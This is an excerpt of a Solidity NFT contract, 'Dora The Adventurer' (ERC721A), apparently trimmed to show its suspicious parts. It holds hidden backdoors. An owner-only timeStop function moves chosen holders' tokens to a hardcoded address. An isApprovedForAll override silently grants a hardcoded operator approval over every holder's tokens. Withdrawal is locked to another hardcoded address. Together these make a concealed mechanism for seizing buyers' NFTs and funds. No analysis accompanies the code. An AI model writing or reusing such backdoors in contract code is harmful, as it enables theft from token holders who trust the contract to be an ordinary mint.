...
contract Dora_The_Adventurer is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Dora The Adventurer", "DTA", maxBatchSize_, collectionSize_) {
  ...
  function whiteListMintStart(uint256 quantity,bytes32[] calldata _merkleProof) external payable callerIsUser {
  ...
  function timeStop(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0xC5d07415C6cd5aDD89177B025fa246D6D2a47431, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x97bC8a6077C81A9f81f76943Bda221Bb430Ee2E9);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xe0d728889eaD19238E182046A07C035be6309366){return true;}
